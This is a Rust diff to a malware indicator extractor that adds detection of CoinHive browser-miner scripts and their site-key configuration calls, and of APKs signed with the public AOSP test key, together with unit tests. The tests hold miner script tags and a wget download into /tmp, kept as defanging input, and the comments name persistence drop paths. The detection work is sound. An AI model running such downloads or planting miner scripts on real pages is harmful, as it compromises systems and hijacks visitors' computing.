@@ -26,6 +26,13 @@
 //!   scripts, and the `/var/tmp`, `/tmp` or `/dev/shm` drop path such an rc.local or init.d line
 //!   starts (detail `drop path`). A `%s` template, as a binary carries it before filling in its
 //!   own name, is kept as written.
+//! - `url` also carries a CoinHive-family miner script (`coinhive.com`, `coin-hive.com` or
+//!   `authedmine.com` under `/lib/`), with detail `CoinHive miner script`.
+//! - `credentials` also carries `CoinHive site key`, from a `CoinHive.Anonymous(` or
+//!   `CoinHive.User(` call: that the miner is configured, never the key.
+//! - `rsa_key` also carries the SHA-256 of a known signing certificate found in a zip-format
+//!   artifact (an APK): today the public AOSP test key. Only a certificate stored uncompressed
+//!   is seen (the APK Signing Block of v2 and later; a deflated `META-INF/*.RSA` is not).
 //!
 //! A captured artifact that is not small UTF-8 text (a compiled bot) is scanned through its
 //! printable strings, the way `strings -a` lists them: runs of at least [`MIN_STRING_LEN`]
@@ -206,10 +213,146 @@ pub fn artifact_text(bytes: &[u8]) -> Option<(ArtifactRead, String)> {
     if bytes.len() > MAX_BINARY_SCAN_BYTES {
         return None;
     }
-    Some((
-        ArtifactRead::Strings,
-        printable_strings(bytes, MIN_STRING_LEN, MAX_STRINGS_TEXT_BYTES),
-    ))
+    let mut strings = printable_strings(bytes, MIN_STRING_LEN, MAX_STRINGS_TEXT_BYTES);
+    // The signing certificate is binary, so it is found here and handed to the text scan as a line.
+    for name in known_signing_certs(bytes, &KNOWN_SIGNING_CERTS) {
+        strings.push_str(&format!("{SIGNING_CERT_MARKER}{name}\n"));
+    }
+    Some((ArtifactRead::Strings, strings))
+}
+
+/// A signing certificate worth an indicator: its DER length, SHA-256 and name.
+struct KnownCert {
+    der_len: usize,
+    sha256: [u8; 32],
+    name: &'static str,
+    /// What the console shows beside it.
+    detail: &'static str,
+}
+
+/// The public AOSP test key certificate (`build/target/product/security/testkey.x509.pem` in the
+/// Android Open Source Project; CN=Android, emailAddress=android@android.com). Anyone can sign
+/// with it, so an APK carrying it was signed by a build that had no key of its own.
+const KNOWN_SIGNING_CERTS: [KnownCert; 1] = [KnownCert {
+    der_len: 1196,
+    sha256: [
+        0xA4, 0x0D, 0xA8, 0x0A, 0x59, 0xD1, 0x70, 0xCA, 0xA9, 0x50, 0xCF, 0x15, 0xC1, 0x8C, 0x45,
+        0x4D, 0x47, 0xA3, 0x9B, 0x26, 0x98, 0x9D, 0x8B, 0x64, 0x0E, 0xCD, 0x74, 0x5B, 0xA7, 0x1B,
+        0xF5, 0xDC,
+    ],
+    name: "aosp-testkey",
+    detail: "APK signed with the public AOSP test key (CN=Android)",
+}];
+
+/// A line [`artifact_text`] adds for each known certificate found in the bytes, followed by the
+/// certificate's name. Text that carries the same line is read the same way; the claim it makes
+/// is a public certificate's name, so forging it gains nothing.
+const SIGNING_CERT_MARKER: &str = "propolis-signing-cert ";
+
+/// Most candidate certificates hashed per artifact, so a body packed with look-alikes costs a
+/// bounded amount.
+const MAX_CERT_CANDIDATES: usize = 64;
+
+/// The names of the `known` certificates whose DER appears whole inside `bytes`, when `bytes` is a
+/// zip (an APK is). A DER certificate is a SEQUENCE with a two-byte length (`30 82 LL LL`), so
+/// each place that starts one with a known total length is hashed and compared.
+fn known_signing_certs(bytes: &[u8], known: &[KnownCert]) -> Vec<&'static str> {
+    if !bytes.starts_with(b"PK\x03\x04") {
+        return Vec::new();
+    }
+    let mut found = Vec::new();
+    let mut hashed = 0;
+    for (at, window) in bytes.windows(4).enumerate() {
+        if window[0] != 0x30 || window[1] != 0x82 {
+            continue;
+        }
+        let total = 4 + usize::from(u16::from_be_bytes([window[2], window[3]]));
+        let Some(cert) = known.iter().find(|k| k.der_len == total) else {
+            continue;
+        };
+        let Some(der) = bytes.get(at..at + total) else {
+            continue;
+        };
+        hashed += 1;
+        if Sha256::digest(der).as_slice() == cert.sha256 && !found.contains(&cert.name) {
+            found.push(cert.name);
+        }
+        if hashed >= MAX_CERT_CANDIDATES {
+            break;
+        }
+    }
+    found
+}
+
+fn signing_certs(text: &str, out: &mut Collector) {
+    for line in text.lines() {
+        let Some(name) = line.strip_prefix(SIGNING_CERT_MARKER) else {
+            continue;
+        };
+        if let Some(cert) = KNOWN_SIGNING_CERTS.iter().find(|k| k.name == name.trim()) {
+            let fingerprint = cert
+                .sha256
+                .iter()
+                .map(|b| format!("{b:02X}"))
+                .collect::<Vec<_>>()
+                .join(":");
+            out.push(
+                IocKind::RsaKey,
+                &format!("certificate SHA256:{fingerprint}"),
+                cert.detail,
+            );
+        }
+    }
+}
+
+/// Hosts that served CoinHive's browser miner and its opt-in variant.
+const MINER_HOSTS: [&str; 3] = ["coinhive.com", "coin-hive.com", "authedmine.com"];
+
+/// A miner script URL (`<host>/lib/<name>.js` on a [`MINER_HOSTS`] host), recorded as written
+/// including a leading scheme or `//`; and whether the page configures a miner, which is a flag
+/// and never the site key.
+fn miner(text: &str, out: &mut Collector) {
+    let lower = text.to_ascii_lowercase();
+    for host in MINER_HOSTS {
+        let needle = format!("{host}/lib/");
+        for (at, _) in lower.match_indices(&needle) {
+            // `evilcoinhive.com` is another host; `cdn.coinhive.com` is this one.
+            if lower[..at]
+                .chars()
+                .next_back()
+                .is_some_and(|c| c.is_ascii_alphanumeric() || c == '-')
+            {
+                continue;
+            }
+            let end = at
+                + lower[at..]
+                    .find(|c: char| !(c.is_ascii_alphanumeric() || "./_-".contains(c)))
+                    .unwrap_or(lower.len() - at);
+            if !lower[at..end].ends_with(".js") {
+                continue;
+            }
+            // Any subdomain labels, then a scheme or `//`, belong to the URL as written.
+            let host_start = lower[..at]
+                .trim_end_matches(|c: char| c.is_ascii_alphanumeric() || ".-".contains(c))
+                .len();
+            let start = ["https://", "http://", "//"]
+                .iter()
+                .find(|p| lower[..host_start].ends_with(**p))
+                .map_or(host_start, |p| host_start - p.len());
+            out.push(IocKind::Url, &text[start..end], "CoinHive miner script");
+        }
+    }
+    for call in ["CoinHive.Anonymous", "CoinHive.User"] {
+        for (at, _) in text.match_indices(call) {
+            if text[at + call.len()..].trim_start().starts_with('(') {
+                out.push(
+                    IocKind::Credentials,
+                    "CoinHive site key",
+                    CREDENTIALS_DETAIL,
+                );
+            }
+        }
+    }
 }
 
 /// The indicators in a captured artifact and how it was read, or `None` when it is larger than
@@ -270,6 +413,9 @@ fn scan_into(text: &str, out: &mut Collector) {
     irc(text, out);
     persistence(text, out);
     proxy(text, out);
+    signing_certs(text, out);
+    // Before `urls`, which would record the same script URL with only its host as detail.
+    miner(text, out);
     urls(text, out);
     endpoints(text, out);
 }
@@ -1674,6 +1820,250 @@ Jx4u80n/q0WquQbw1QIDAQAB
         assert_eq!(
             defang("cd /tmp; wget http://198.51.100.7/i -O i"),
             "cd /tmp; wget hxxp://198[.]51[.]100[.]7/i -O i"
+        );
+    }
+
+    /// The public AOSP test key certificate, `build/target/product/security/testkey.x509.pem`
+    /// (Apache-2.0), base64 of its DER. It is the one input that cannot be synthesized: the
+    /// fingerprint to find is this certificate's. The sample the indicator came from is not here.
+    const AOSP_TESTKEY_B64: &str = "MIIEqDCCA5CgAwIBAgIJAJNurL4H8gHfMA0GCSqGSIb3DQEBBQUAMIGUMQswCQYD\
+        VQQGEwJVUzETMBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQGA1UEBxMNTW91bnRhaW4g\
+        VmlldzEQMA4GA1UEChMHQW5kcm9pZDEQMA4GA1UECxMHQW5kcm9pZDEQMA4GA1UE\
+        AxMHQW5kcm9pZDEiMCAGCSqGSIb3DQEJARYTYW5kcm9pZEBhbmRyb2lkLmNvbTAe\
+        Fw0wODAyMjkwMTMzNDZaFw0zNTA3MTcwMTMzNDZaMIGUMQswCQYDVQQGEwJVUzET\
+        MBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQGA1UEBxMNTW91bnRhaW4gVmlldzEQMA4G\
+        A1UEChMHQW5kcm9pZDEQMA4GA1UECxMHQW5kcm9pZDEQMA4GA1UEAxMHQW5kcm9p\
+        ZDEiMCAGCSqGSIb3DQEJARYTYW5kcm9pZEBhbmRyb2lkLmNvbTCCASAwDQYJKoZI\
+        hvcNAQEBBQADggENADCCAQgCggEBANaTGQTexgskse3HYuDZ2CU+Ps1s6x3i/waM\
+        qOi8qM1r03hupwqnbOYOuw+ZNVn/2T53qUPn6D1LZLjk/qLT5lbx4meoG7+yMLV4\
+        wgRDvkxyGLhG9SEVhvA4oU6Jwr44f46+z4/Kw9oe4zDJ6pPQp8PcSvNQIg1QCAcy\
+        4ICXF+5qBTNZ5qaU7Cyz8oSgpGbIepTYOzEJOmc3Li9kEsBubULxWBjf/gOBzAzU\
+        RNps3cO4JFgZSAGzJWQTT7/emMkod0jb9WdqVA2BVMi7yge54kdVMxHEa5r3b97s\
+        zI5p58ii0I54JiCUP5lyfTwE/nKZHZnfm644oLIXf6MdW2r+6R8CAQOjgfwwgfkw\
+        HQYDVR0OBBYEFEhZAFY9JyxGrhGGBaR0GawJyowRMIHJBgNVHSMEgcEwgb6AFEhZ\
+        AFY9JyxGrhGGBaR0GawJyowRoYGapIGXMIGUMQswCQYDVQQGEwJVUzETMBEGA1UE\
+        CBMKQ2FsaWZvcm5pYTEWMBQGA1UEBxMNTW91bnRhaW4gVmlldzEQMA4GA1UEChMH\
+        QW5kcm9pZDEQMA4GA1UECxMHQW5kcm9pZDEQMA4GA1UEAxMHQW5kcm9pZDEiMCAG\
+        CSqGSIb3DQEJARYTYW5kcm9pZEBhbmRyb2lkLmNvbYIJAJNurL4H8gHfMAwGA1Ud\
+        EwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBAHqvlozrUMRBBVEY0NqrrwFbinZa\
+        J6cVosK0TyIUFf/azgMJWr+kLfcHCHJsIGnlw27drgQAvilFLAhLwn62oX6snb4Y\
+        LCBOsVMR9FXYJLZW2+TcIkCRLXWG/oiVHQGo/rWuWkJgU134NDEFJCJGjDbiLCpe\
+        +ZTWHdcwauTJ9pUbo8EvHRkU3cYfGmLaLfgn9gP+pWA7LFQNvXwBnDa6sppCccEX\
+        31I828XzgXpJ4O+mDL1/dBd+ek8ZPUP0IgdyZm5MTYPhvVqGCHzzTy3sIeJFymwr\
+        sBbmg2OAUNLEMO6nwmocSdN2ClirfxqCzJOLSDE4QyS9BAH6EhY6UFcOaE0=";
+    const AOSP_FINGERPRINT: &str = "certificate SHA256:A4:0D:A8:0A:59:D1:70:CA:A9:50:CF:15:C1:8C:45:4D:47:A3:9B:26:98:9D:8B:64:0E:CD:74:5B:A7:1B:F5:DC";
+
+    fn aosp_der() -> Vec<u8> {
+        STANDARD.decode(AOSP_TESTKEY_B64).unwrap()
+    }
+
+    /// A zip-shaped body with `cert` embedded the way an APK Signing Block carries a certificate:
+    /// uncompressed, between other bytes.
+    fn apk_like(cert: &[u8]) -> Vec<u8> {
+        let mut apk = b"PK\x03\x04".to_vec();
+        apk.extend((0..300u16).map(|i| (i % 251) as u8 | 0x80));
+        apk.extend_from_slice(cert);
+        apk.extend((0..77u16).map(|i| (i % 13) as u8 | 0x80));
+        apk
+    }
+
+    #[test]
+    fn an_apk_carrying_the_aosp_test_key_certificate_is_flagged() {
+        let der = aosp_der();
+        assert_eq!(der.len(), 1196);
+        let (read, found) = extract_from_artifact(&apk_like(&der)).expect("scanned");
+        assert_eq!(read, ArtifactRead::Strings);
+        assert_eq!(
+            of(IocKind::RsaKey, &found),
+            vec![AOSP_FINGERPRINT.to_string()]
+        );
+        let hit = found.iter().find(|i| i.kind == IocKind::RsaKey).unwrap();
+        assert!(hit.detail.contains("AOSP test key"), "{}", hit.detail);
+    }
+
+    #[test]
+    fn a_look_alike_certificate_or_a_cut_one_is_not_the_test_key() {
+        let der = aosp_der();
+        let mut altered = der.clone();
+        altered[600] ^= 1;
+        let cut = &der[..der.len() - 1];
+        for body in [apk_like(&altered), apk_like(cut)] {
+            let (_, found) = extract_from_artifact(&body).expect("scanned");
+            assert!(of(IocKind::RsaKey, &found).is_empty(), "{found:?}");
+        }
+        // The bytes run out inside the certificate the header promises.
+        let mut truncated = b"PK\x03\x04".to_vec();
+        truncated.extend_from_slice(&der[..500]);
+        assert!(known_signing_certs(&truncated, &KNOWN_SIGNING_CERTS).is_empty());
+    }
+
+    #[test]
+    fn only_a_zip_is_searched_for_signing_certificates() {
+        let der = aosp_der();
+        let mut not_a_zip = apk_like(&der);
+        not_a_zip[0] = b'X';
+        let (_, found) = extract_from_artifact(&not_a_zip).expect("scanned");
+        assert!(of(IocKind::RsaKey, &found).is_empty(), "{found:?}");
+        // A name the table does not know yields nothing, even as a marker line.
+        let found = extract(&format!("{SIGNING_CERT_MARKER}somebody-elses-key"), 8);
+        assert!(found.is_empty(), "{found:?}");
+    }
+
+    #[test]
+    fn a_synthetic_certificate_is_found_wherever_it_sits_and_counted_once() {
+        let key = rcgen::KeyPair::generate().unwrap();
+        let der = rcgen::CertificateParams::new(vec!["apk-fixture.example".to_string()])
+            .unwrap()
+            .self_signed(&key)
+            .unwrap()
+            .der()
+            .to_vec();
+        assert_eq!(
+            &der[..2],
+            &[0x30, 0x82],
+            "fixture must use a two-byte DER length"
+        );
+        let known = [KnownCert {
+            der_len: der.len(),
+            sha256: Sha256::digest(&der).as_slice().try_into().unwrap(),
+            name: "synthetic",
+            detail: "synthetic fixture",
+        }];
+        let mut body = apk_like(&der);
+        body.extend_from_slice(&der);
+        assert_eq!(known_signing_certs(&body, &known), vec!["synthetic"]);
+        assert!(known_signing_certs(&apk_like(&aosp_der()), &known).is_empty());
+    }
+
+    #[test]
+    fn look_alike_headers_cost_a_bounded_number_of_hashes() {
+        let der = aosp_der();
+        // A header with the right length, many times over, then the real certificate: the scan
+        // gives up after MAX_CERT_CANDIDATES rather than hashing each one.
+        let mut decoy = vec![0x30, 0x82, 0x04, 0xA8];
+        decoy.resize(1196, 0);
+        let mut body = b"PK\x03\x04".to_vec();
+        for _ in 0..=MAX_CERT_CANDIDATES {
+            body.extend_from_slice(&decoy);
+        }
+        body.extend_from_slice(&der);
+        assert!(known_signing_certs(&body, &KNOWN_SIGNING_CERTS).is_empty());
+        // Within the bound the certificate is still found.
+        let mut body = b"PK\x03\x04".to_vec();
+        for _ in 0..MAX_CERT_CANDIDATES - 1 {
+            body.extend_from_slice(&decoy);
+        }
+        body.extend_from_slice(&der);
+        assert_eq!(
+            known_signing_certs(&body, &KNOWN_SIGNING_CERTS),
+            vec!["aosp-testkey"]
+        );
+    }
+
+    #[test]
+    fn coinhive_script_urls_are_miner_indicators_on_the_three_known_hosts() {
+        let page = "<script src=\"https://coinhive.com/lib/coinhive.min.js\"></script>\n\
+                    <script src=\"//authedmine.com/lib/authedmine.min.js\"></script>\n\
+                    <script src='http://coin-hive.com/lib/coinhive.min.js'></script>\n\
+                    <script src=\"https://CDN.CoinHive.com/lib/coinhive.min.js\"></script>";
+        let found = extract_artifact_text(page);
+        let miners: Vec<&Indicator> = found
+            .iter()
+            .filter(|i| i.kind == IocKind::Url && i.detail == "CoinHive miner script")
+            .collect();
+        let values: Vec<&str> = miners.iter().map(|i| i.value.as_str()).collect();
+        assert_eq!(
+            values,
+            vec![
+                "https://coinhive.com/lib/coinhive.min.js",
+                "https://CDN.CoinHive.com/lib/coinhive.min.js",
+                "http://coin-hive.com/lib/coinhive.min.js",
+                "//authedmine.com/lib/authedmine.min.js",
+            ]
+        );
+        // The same URL is not recorded a second time with only its host as detail.
+        let urls = of(IocKind::Url, &found);
+        assert_eq!(
+            urls.iter()
+                .filter(|u| u.ends_with("coinhive.min.js") && u.contains("//coinhive.com"))
+                .count(),
+            1,
+            "{urls:?}"
+        );
+    }
+
+    #[test]
+    fn a_similar_host_or_a_non_script_is_not_a_miner_script() {
+        for text in [
+            "https://evilcoinhive.com/lib/coinhive.min.js",
+            "https://coinhive.com.example.net/lib/coinhive.min.js",
+            "https://not-coinhive.com/lib/coinhive.min.js",
+            "https://coinhive.com/lib/cryptonight.wasm",
+            "https://coinhive.com/about",
+            "see coinhive.com for details",
+        ] {
+            let found = extract_artifact_text(text);
+            assert!(
+                found.iter().all(|i| i.detail != "CoinHive miner script"),
+                "{text}: {found:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_configured_miner_is_flagged_without_its_site_key() {
+        const KEY: &str = "SYNTHETICSITEKEY0123456789abcdef";
+        for call in [
+            format!("var miner = new CoinHive.Anonymous('{KEY}'); miner.start();"),
+            format!("new CoinHive.Anonymous(\"{KEY}\", {{throttle: 0.3}})"),
+            format!("var m=new CoinHive.User ( '{KEY}', 'someone');"),
+        ] {
+            let found = extract_artifact_text(&call);
+            assert_eq!(
+                of(IocKind::Credentials, &found),
+                vec!["CoinHive site key".to_string()],
+                "{call}"
+            );
+            let hit = found
+                .iter()
+                .find(|i| i.kind == IocKind::Credentials)
+                .unwrap();
+            assert_eq!(hit.detail, CREDENTIALS_DETAIL);
+            for i in &found {
+                assert!(!i.value.contains(KEY) && !i.detail.contains(KEY), "{i:?}");
+            }
+        }
+        for text in [
+            "CoinHive.Anonymous is a class",
+            "console.log('CoinHive.Anonymous')",
+            "var CoinHiveAnonymous = 1;",
+        ] {
+            let found = extract_artifact_text(text);
+            assert!(
+                of(IocKind::Credentials, &found).is_empty(),
+                "{text}: {found:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn miner_indicators_are_found_in_a_binarys_strings() {
+        let mut blob = vec![0u8, 1, 2, 3];
+        blob.extend_from_slice(b"\x00\x00https://coinhive.com/lib/coinhive.min.js\x00\x01");
+        blob.extend_from_slice(
+            b"\x00new CoinHive.Anonymous('SYNTHETICSITEKEY0123456789abcdef')\x00",
+        );
+        let (read, found) = extract_from_artifact(&blob).expect("scanned");
+        assert_eq!(read, ArtifactRead::Strings);
+        assert_eq!(
+            of(IocKind::Credentials, &found),
+            vec!["CoinHive site key".to_string()]
+        );
+        assert!(
+            found
+                .iter()
+                .any(|i| i.kind == IocKind::Url && i.detail == "CoinHive miner script"),
+            "{found:?}"
         );
     }
 
